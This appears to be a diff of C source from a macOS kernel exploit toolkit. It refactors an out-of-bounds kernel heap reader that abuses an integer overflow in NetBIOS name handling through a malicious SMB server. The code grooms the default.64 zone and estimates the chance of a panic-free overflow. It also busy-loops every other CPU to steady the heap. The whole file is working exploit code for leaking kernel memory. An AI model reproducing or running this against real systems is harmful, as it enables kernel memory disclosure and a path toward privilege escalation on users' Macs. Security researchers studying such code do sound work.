@@ -21,12 +21,18 @@
 #include <xe/util/binary.h>
 #include <xe/util/misc.h>
 
-#include "zkext_neighbor_reader.h"
-#include "kmem_oob_reader.h"
-#include "allocator_nrnw.h"
 #include <macos/kernel.h>
 
+#include "oob_reader_ovf.h"
+#include "oob_reader_base.h"
+#include "allocator_nrnw.h"
+
 #include "../smb/client.h"
+
+///
+/// Uses module `oob_reader_base.c` to provide safe OOB read from zones in `KHEAP_KEXT`
+/// with element size greater than 32
+///
 
 #define MAX_TRIES 25
 
@@ -38,10 +44,11 @@
 #define NUM_KEXT_64_FRAGMENTED_PAGES 64
 #define NUM_KEXT_64_PAD_END_PAGES 8
 
-#define KMEM_ZKEXT_NB_ENABLE_CPU_DOS TRUE
 
-
-kmem_allocator_nrnw_t kmem_zkext_neighbor_reader_prepare(const struct sockaddr_in* smb_addr) {
+kmem_allocator_nrnw_t oob_reader_ovf_fragment_default_64(const struct sockaddr_in* smb_addr) {
+    /// The allocations made by `kmem_allocator_nrnw` are made on zones from `KHEAP_KEXT`
+    /// As of macOS 12.3, both `KHEAP_DEFAULT` and `KHEAP_KEXT` uses same zones.
+    /// So these allocations will be done on default.64 zone
     kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
     kmem_allocator_nrnw_t element_allocator = kmem_allocator_nrnw_create(smb_addr);
     
@@ -57,38 +64,49 @@ kmem_allocator_nrnw_t kmem_zkext_neighbor_reader_prepare(const struct sockaddr_i
 }
 
 
-double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
+float oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
+    /// Number of elements in default.64 that would be overwritten due to OOB write when
+    /// performing OOB read with overflow
     int num_overwritten = ((int)addr_len - 1) / 64;
+    
     int total_size = (num_overwritten + 1) * 64;
+    /// Length of netbios name first segment data required to read all the overwritten elements
+    /// in default.64
     uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
     xe_assert_cond(total_size, <=, UINT8_MAX);
     
     uint32_t* local_nb_name_size = alloca(sizeof(uint32_t));
     *local_nb_name_size = 2048;
     char* local_nb_name = malloc(*local_nb_name_size);
-    int num_hits = 0;
     
+    int num_safe_ovfs = 0;
     for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
         dispatch_semaphore_t sem = dispatch_semaphore_create(0);
         
         dispatch_async(xe_dispatch_queue(), ^() {
-            struct kmem_oob_reader_args params;
+            struct oob_reader_base_args params;
             params.smb_addr = *smb_addr;
+            /// Not using server socket address for OOB read
             params.saddr_snb_len = sizeof(struct sockaddr_nb);
             params.saddr_ioc_len = sizeof(struct sockaddr_nb);
             params.saddr_snb_name_seglen = 3;
             static_assert(sizeof(struct sockaddr_nb) > 48 && sizeof(struct sockaddr_nb) <= 64, "");
+            /// `snb_len` set to 64 so that OOB write will not happen
             params.laddr_snb_len = 64;
             params.laddr_ioc_len = zone_size;
             params.laddr_snb_name_seglen = to_read;
             
-            kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
+            oob_reader_base_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
             dispatch_semaphore_signal(sem);
         });
         
-        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 3 * 1000000000ULL))) {
-            xe_log_warn("kmem neighbor read timed out");
-            continue;
+        /// Due to the integer overflow in `nb_put_name` method, if any of the netbios
+        /// segment data length is 255, then `nb_put_name` method will never return
+        /// Detect this condition and stop waiting if this happens.
+        /// See `poc_snb_name_oob_read` for more details
+        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * 1000000000ULL))) {
+            xe_log_error("kmem neighbor read timed out, restart the xe_smbx server, kill the xe_kmem process and try again");
+            xe_abort();
         }
         
         xe_assert_cond(*local_nb_name_size, >=, to_read + 1);
@@ -98,61 +116,72 @@ double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint
         
         int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
         
-        _Bool is_hit = TRUE;
+        _Bool is_safe_ovf = TRUE;
+        /// Check data of each overwritten default.64 zone element and see if they match
+        /// with safe allocations of `oob_reader_ovf_fragment_default_64`
         for (int i=0; i<num_overwritten; i++) {
             struct sockaddr_in in;
             memcpy(&in, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_in));
             if (in.sin_len != 64 || in.sin_family != ALLOCATOR_NRNW_SOCK_ADDR_FAMILY || in.sin_port != ALLOCATOR_NRNW_SOCK_ADDR_PORT) {
-                is_hit = FALSE;
+                is_safe_ovf = FALSE;
                 break;
             }
         }
         
-        if (is_hit) {
-            num_hits++;
+        if (is_safe_ovf) {
+            num_safe_ovfs++;
         }
     }
     
     free(local_nb_name);
-    return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
+    return (float)num_safe_ovfs / (float)NUM_SAMPLES_FOR_PROBABILITY;
 }
 
-int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
+int oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
     xe_assert_cond(data_size, <=, zone_size);
 //    xe_assert_cond(zone_size, >=, 64);
     xe_assert_cond(zone_size, <, 128);
     
-    kmem_allocator_nrnw_t element_allocator = kmem_zkext_neighbor_reader_prepare(smb_addr);
+    /// Fragment the default.64 zone. The allocations used for fragmenting the zone are
+    /// of `struct sockaddr` type. OOB writes to these allocations are safe.
+    kmem_allocator_nrnw_t element_allocator = oob_reader_ovf_fragment_default_64(smb_addr);
     
     int error = EAGAIN;
     for (int i=0; i<MAX_TRIES; i++) {
-        double probability = kmem_zkext_neighbor_reader_check(smb_addr, zone_size, zone_size * 2);
+        /// Perform test OOB read on default.64 zones without overflow write to see if
+        /// OOB reads requiring overflow may cause kernel panic
+        double probability = oob_reader_ovf_check(smb_addr, zone_size, zone_size * 2);
         if (probability < CUTOFF_PROBABILITY) {
-            xe_log_debug("skipping read due to low success probability of %.2f", probability);
+            xe_log_debug("skipping OOB read (with ovf) attempt %d due to low success probability of %.2f", i, probability);
             continue;
         }
-        
-        uint32_t local_nb_name_size = 2048;
-        char* local_nb_name = malloc(local_nb_name_size);
                 
         uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
         
-        struct kmem_oob_reader_args params;
+        struct oob_reader_base_args params;
         params.smb_addr = *smb_addr;
-        params.saddr_snb_len = sizeof(struct sockaddr_nb);
+        
+        /// Server socket address not used to perform OOB read
         params.saddr_ioc_len = sizeof(struct sockaddr_nb);
+        params.saddr_snb_len = sizeof(struct sockaddr_nb);
         params.saddr_snb_name_seglen = 3;
-        params.laddr_snb_len = zone_size * 2;
+        
+        /// Only local socket address is used to perform OOB read
         params.laddr_ioc_len = zone_size;
+        params.laddr_snb_len = zone_size * 2;
         params.laddr_snb_name_seglen = snb_name_seglen;
         
-        kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
+        /// Buffer for reading the local netbios name received by xe_smbx server
+        uint32_t local_nb_name_size = 2048;
+        char* local_nb_name = malloc(local_nb_name_size);
         
+        oob_reader_base_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
         xe_assert_cond(local_nb_name_size, >=, snb_name_seglen);
         
         uint8_t first_segment_len = local_nb_name[0];
         xe_assert_cond(first_segment_len, ==, snb_name_seglen);
         
+        /// Skip data from memory allocated for the socket address
         int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
         xe_log_debug_hexdump(&local_nb_name[bytes_to_skip], data_size, "neighbor data: ");
         memcpy(data, &local_nb_name[bytes_to_skip], data_size);
@@ -166,8 +195,7 @@ int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr,
     return error;
 }
 
-int kmem_zkext_neighbor_reader_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
-#if defined(KMEM_ZKEXT_NB_ENABLE_CPU_DOS)
+int oob_reader_ovf_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
     dispatch_queue_t queue = dispatch_queue_create("reader", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, DISPATCH_QUEUE_PRIORITY_HIGH));
 
     volatile _Bool* stop = alloca(sizeof(_Bool));
@@ -176,17 +204,15 @@ int kmem_zkext_neighbor_reader_read(const struct sockaddr_in* smb_addr, uint8_t 
     dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
         if (index == 0) {
             xe_sleep_ms(10);
-            *res = kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
+            *res = oob_reader_ovf_read_internal(smb_addr, zone_size, data, data_size);
             *stop = TRUE;
         } else {
+            /// Reduce effect of other processes on kernel heap
             while (!*stop) {}
         }
     });
 
     dispatch_release(queue);
     return *res;
-#else
-    return kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
-#endif
 }
 
